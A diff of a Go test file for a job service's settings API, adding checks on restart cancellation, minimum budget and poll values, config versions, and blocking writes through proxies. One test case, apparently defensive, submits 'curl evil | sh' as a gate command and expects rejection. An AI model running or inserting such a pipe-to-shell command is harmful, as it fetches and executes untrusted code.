@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"io"
 	"net/http"
+	"net/http/httptest"
 	"os"
 	"path/filepath"
 	"strings"
@@ -14,8 +15,13 @@ import (
 type fakeRestarter struct{ pending bool }
 
 func (f *fakeRestarter) RequestRestart(context.Context) int { f.pending = true; return 2 }
-func (f *fakeRestarter) RestartPending() bool               { return f.pending }
-func (f *fakeRestarter) Running() int                       { return 2 }
+func (f *fakeRestarter) CancelRestart(context.Context) bool {
+	was := f.pending
+	f.pending = false
+	return was
+}
+func (f *fakeRestarter) RestartPending() bool { return f.pending }
+func (f *fakeRestarter) Running() int         { return 2 }
 
 // settingsSetup serves the API over a copy of the repo's factory.yaml.
 func settingsSetup(t *testing.T, listen string) (string, string, *Server, *fakeRestarter) {
@@ -93,13 +99,20 @@ func TestSettingsSave(t *testing.T) {
 	}{
 		{`{"changes":[{"path":["runner","kind"],"value":"local"}]}`, "runner.kind can't be changed here", 400},
 		{`{"changes":[{"path":["gates","commands","test"],"value":"curl evil | sh"}]}`, "can't be changed here", 400},
-		{`{"changes":[{"path":["budgets","daily_total"],"value":0}]}`, "budgets.daily_total must be \\u003e 0", 400},
+		{`{"changes":[{"path":["budgets","daily_total"],"value":0}]}`, "budgets.daily_total must be at least 0.01", 400},
+		{`{"changes":[{"path":["budgets","concurrent_jobs"],"value":0}]}`, "must be at least 1", 400},
+		{`{"changes":[{"path":["intake","poll_interval"],"value":"1s"}]}`, "at least 10s", 400},
 		{`{"changes":[{"path":["routing","review","fast"],"value":true}]}`, "routing.review: fast mode is Claude's", 400},
 		{`{"changes":[{"path":["budgets","concurrent_jobs"],"value":"many"}]}`, "must be a number", 400},
 		{`{"changes":[]}`, "nothing to change", 400},
 		{`{"changes":[{"path":["budgets","daily_total"],"value":70}],"version":"stale"}`, "changed since", 409},
+		{`{"changes":[{"path":["budgets","daily_total"],"value":70}],"version":""}`, "changed since", 409},
 	} {
-		code, body := postJSON(t, base+"/api/v1/settings", "", c.body)
+		body := c.body
+		if !strings.Contains(body, `"version"`) {
+			body = `{"version":"` + ConfigVersion(orig) + `",` + body[1:]
+		}
+		code, body := postJSON(t, base+"/api/v1/settings", "", body)
 		if code != c.code || !strings.Contains(body, c.want) {
 			t.Errorf("%s: %d %s", c.body, code, body)
 		}
@@ -153,6 +166,16 @@ func TestSettingsSave(t *testing.T) {
 	if !st.RestartPending {
 		t.Fatal("restart not pending")
 	}
+	if code, body = postJSON(t, base+"/api/v1/settings/restart/cancel", "", `{}`); code != 200 || fr.pending {
+		t.Fatalf("cancel = %d %s", code, body)
+	}
+	// A file broken by hand since: no restart into a config that won't load.
+	if err := os.WriteFile(path, []byte("budgets: [nope\n"), 0o640); err != nil {
+		t.Fatal(err)
+	}
+	if code, body = postJSON(t, base+"/api/v1/settings/restart", "", `{}`); !strings.Contains(body, "doesn't load") || fr.pending {
+		t.Fatalf("restart over a broken file = %d %s", code, body)
+	}
 }
 
 func TestSettingsReadOnlyWithoutAPassword(t *testing.T) {
@@ -174,13 +197,25 @@ func TestSettingsReadOnlyWithoutAPassword(t *testing.T) {
 		t.Fatal("the file changed")
 	}
 	s.Login = &Login{Password: "correct horse battery"}
-	if ok, _ := s.settingsWritable(); !ok {
+	if ok, _ := s.settingsWritable(nil); !ok {
 		t.Fatal("a password makes settings writable anywhere")
 	}
 	for addr, want := range map[string]bool{"localhost:8080": true, "[::1]:80": true, "0.0.0.0:8080": false, "192.168.1.5:80": false, "": false} {
 		s.Login, s.Listen = nil, addr
-		if ok, _ := s.settingsWritable(); ok != want {
+		if ok, _ := s.settingsWritable(nil); ok != want {
 			t.Errorf("%q: writable = %v", addr, ok)
+		}
+	}
+	// A loopback listener published by a proxy: the request names the
+	// proxy's host, or says it was forwarded.
+	s.Listen = "127.0.0.1:8080"
+	proxied := httptest.NewRequest("POST", "http://factory.tailnet.ts.net/api/v1/settings", nil)
+	forwarded := httptest.NewRequest("POST", "http://127.0.0.1:8080/api/v1/settings", nil)
+	forwarded.Header.Set("X-Forwarded-For", "100.64.0.2")
+	local := httptest.NewRequest("POST", "http://localhost:8080/api/v1/settings", nil)
+	for r, want := range map[*http.Request]bool{proxied: false, forwarded: false, local: true} {
+		if ok, _ := s.settingsWritable(r); ok != want {
+			t.Errorf("%s %v: writable = %v", r.Host, r.Header, ok)
 		}
 	}
 }
